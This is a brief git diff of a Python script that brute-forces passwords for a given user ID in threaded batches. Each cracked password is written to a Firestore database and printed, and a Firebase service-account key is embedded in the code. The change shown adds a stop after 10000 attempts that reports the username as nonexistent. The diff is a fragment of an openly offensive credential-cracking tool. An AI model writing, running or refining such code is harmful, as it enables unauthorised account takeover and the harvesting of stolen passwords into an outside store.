@@ -21,7 +21,6 @@ PRIVATE_KEY = {
   "universe_domain": "googleapis.com"
 }
 
-
 cred = credentials.Certificate(PRIVATE_KEY)
 firebase_admin.initialize_app(cred)
 
@@ -104,9 +103,14 @@ def bruteforceLogin(userId, start, batchSize=100, threads=10):
                 addPasswordToFirestore(fuserId, f.result())
                 print(f"Password for {userId} is: {f.result()}")
                 return
-                
+        
+        if p>10000:
+            print("Username does not exist")
+            return
+            
         p+=batchSize
         q+=batchSize
+
 
 
 
